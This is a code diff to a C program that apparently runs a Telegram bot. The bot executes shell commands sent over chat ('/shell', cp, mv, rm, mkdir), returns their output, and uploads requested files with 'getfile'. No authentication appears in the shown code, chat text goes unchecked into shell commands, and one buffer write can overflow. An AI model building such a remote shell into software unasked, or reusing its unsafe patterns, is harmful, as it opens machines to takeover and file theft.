@@ -13,7 +13,7 @@
 
 
 
-void changecommand(char *id,char *text,char *pName);
+int changecommand(char *id,char *text,char *pName);
 
 
 
@@ -128,7 +128,8 @@ int main(int argc , char *argv[])
         printf("%s\n",chat_text);
        
         // printf("b4 changecmd\n");
-        changecommand(chat_id,chat_text,argv[0]);
+        int exec_status;
+        exec_status = changecommand(chat_id,chat_text,argv[0]);
         // printf("af changecmd\n");
         
         // printf("%s\n", chat_text);
@@ -136,79 +137,83 @@ int main(int argc , char *argv[])
         FILE *fp, *error_file, *exe_file;
         fp = popen("touch result.txt","r");
         fp = popen("touch error.txt","r");
-        telegram_send_act(chat_id, "typing");
+        
         // usleep(10000);
-        sleep(1);
-        char buf[2000], msg[2010];
-        bzero(buf,1999);
-        exe_file = fopen("result.txt","r");
-
-        fseek(exe_file, 0, SEEK_END);
-        int result_len = ftell(exe_file);
-        rewind(exe_file);
-
-        fclose(exe_file);
-
-        if(result_len == 0)
-        {
-            error_file = fopen("error.txt","r");        
-            if(error_file != NULL)
-            {
-                while(!feof(error_file)){
-                    memset(buf, 0, sizeof(buf));
-                    int bufflen = fread(buf, 1, sizeof(buf), error_file);
-                    buf[bufflen] = 0;
-                }
-                
-            }
-            fclose(error_file);
-            
-            if(strlen(buf) <= 0){
-                strcpy(buf, "No output");
-            }
-
-            printf("Null\n");
-            sprintf(msg, "```\n%s\n```", buf);
+        
+        if(exec_status == 0){
+            sleep(1);
             telegram_send_act(chat_id, "typing");
-            telegram_send_msg(chat_id, msg);
-            printf("%s\n", buf);
+            char buf[2000], msg[2010];
             bzero(buf,1999);
-        }
-        else if(result_len < 1024)
-        {
-            exe_file = fopen("result.txt", "r");
-            if(exe_file != NULL){
-                while(!feof(exe_file)){
-                    memset(buf, 0, sizeof(buf));
-                    int bufflen = fread(buf, 1, sizeof(buf), exe_file);
-                    buf[bufflen] = 0;
-                }
-            }
+            exe_file = fopen("result.txt","r");
+
+            fseek(exe_file, 0, SEEK_END);
+            int result_len = ftell(exe_file);
+            rewind(exe_file);
+
             fclose(exe_file);
 
-            // printf("Yeah!\n");
-            // fgets(buf, 1024, fp);
-            //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
-            sprintf(msg, "```\n%s\n```", buf);
-            telegram_send_act(chat_id, "typing");
-            telegram_send_msg(chat_id, msg);
-            printf("%s\n", buf);
-            bzero(buf,1999);
+            if(result_len == 0)
+            {
+                error_file = fopen("error.txt","r");        
+                if(error_file != NULL)
+                {
+                    while(!feof(error_file)){
+                        memset(buf, 0, sizeof(buf));
+                        int bufflen = fread(buf, 1, sizeof(buf), error_file);
+                        buf[bufflen] = 0;
+                    }
+                    
+                }
+                fclose(error_file);
+                
+                if(strlen(buf) <= 0){
+                    strcpy(buf, "No output");
+                }
 
-        }
-        else{
-            //sending_exe.log
-            telegram_send_act(chat_id, "upload_document");
-            telegram_send_file(chat_id, "result.txt");
-            printf("send result.txt\n");
-        }
-        // printf("wow");
-        
+                printf("Null\n");
+                sprintf(msg, "```\n%s\n```", buf);
+                telegram_send_act(chat_id, "typing");
+                telegram_send_msg(chat_id, msg);
+                printf("%s\n", buf);
+                bzero(buf,1999);
+            }
+            else if(result_len < 1024)
+            {
+                exe_file = fopen("result.txt", "r");
+                if(exe_file != NULL){
+                    while(!feof(exe_file)){
+                        memset(buf, 0, sizeof(buf));
+                        int bufflen = fread(buf, 1, sizeof(buf), exe_file);
+                        buf[bufflen] = 0;
+                    }
+                }
+                fclose(exe_file);
+
+                // printf("Yeah!\n");
+                // fgets(buf, 1024, fp);
+                //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
+                sprintf(msg, "```\n%s\n```", buf);
+                telegram_send_act(chat_id, "typing");
+                telegram_send_msg(chat_id, msg);
+                printf("%s\n", buf);
+                bzero(buf,1999);
+
+            }
+            else{
+                //sending_exe.log
+                telegram_send_act(chat_id, "upload_document");
+                telegram_send_file(chat_id, "result.txt");
+                printf("send result.txt\n");
+            }
+            // printf("wow");
+        }    
         fp = popen("rm result.txt","r");
         fp = popen("rm error.txt","r");
+    
     }
 }
-void changecommand(char *id,char *text,char *pName) {
+int changecommand(char *id,char *text,char *pName) {
     char text_build[4000], command[4000],cmdArg[4000];
     char path[4000];
     int start_index, index = 0, length;
@@ -230,6 +235,7 @@ void changecommand(char *id,char *text,char *pName) {
     }
     if(strchr(text_build,' ') == NULL){
         space_found = -1;
+        telegram_send_act(id, "typing");
         if(strcmp(text_build,"/shell") == 0){
             telegram_send_msg(id,"/shell <Unix-commad>");
             // printf("argument not found,\n");
@@ -256,6 +262,7 @@ void changecommand(char *id,char *text,char *pName) {
             getHostname(text_build);
             telegram_send_msg(id,text_build);          
         }
+        return -1;
     }
     // printf("b4 cut string\n");
     strncpy(command,text_build+1,space_loc);
@@ -268,36 +275,43 @@ void changecommand(char *id,char *text,char *pName) {
     {
         sprintf(text_build, "%s",cmdArg);
         exeCMD(text_build);
+        return 0;
         // strcpy(command_detail, "Exec shell commands with timeout.");
+
     }
     else if(strcmp(command, "cp") == 0 && space_found != -1)
     {
         printf("%d",space_found);
         sprintf(text_build, "%s%s",command,cmdArg);
         exeCMD(text_build);
+        return 0;
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
     else if(strcmp(command, "mv") == 0  && space_found != -1)
     {
         sprintf(text_build, "%s%s",command,cmdArg);
         exeCMD(text_build);
+        return 0;
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
     else if(strcmp(command, "rm") == 0  && space_found != -1)
     {
         sprintf(text_build, "%s%s",command,cmdArg);
         exeCMD(text_build);
+        return 0;
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
     else if(strcmp(command, "mkdir") == 0  && space_found != -1)
     {
         sprintf(text_build, "%s%s",command,cmdArg);
         exeCMD(text_build);
+        return 0;
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
     else if(strcmp(command, "getfile") == 0  && space_found != -1)
     {
         telegram_send_file(id,cmdArg);
+        return 0;
         // strcpy(command_detail, "Exec shell commands with timeout.");
     }
 
